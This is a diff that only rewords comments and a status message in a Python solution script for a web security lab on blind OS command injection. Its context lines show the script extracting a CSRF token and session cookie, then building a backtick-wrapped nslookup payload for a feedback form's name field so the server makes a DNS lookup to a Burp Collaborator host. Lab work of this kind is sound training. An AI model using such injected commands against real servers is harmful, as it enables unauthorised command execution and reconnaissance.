@@ -7,7 +7,7 @@
 # Lab: Blind OS command injection with out-of-band interaction
 #
 # Steps: 1. Fetch the feedback page
-#        2. Extract csrf token and session cookie
+#        2. Extract the csrf token and session cookie
 #        3. Inject payload into the name field when submitting a feedback to
 #           issue a DNS lookup to burp collaborator.
 #        4. Check your burp collaborator for the DNS lookup
@@ -51,7 +51,7 @@ session = injection.cookies.get("session")
 # extract the csrf token
 csrf = re.findall("csrf.+value=\"(.+)\"", injection.text)[0]
 
-print(Fore.WHITE + "⦗2⦘ Extracting csrf token and session cookie.. " + Fore.GREEN + "OK")
+print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie.. " + Fore.GREEN + "OK")
 
 # the payload to issue a DNS lookup to burp collaborator
 payload = f"`nslookup {collaborator}`"
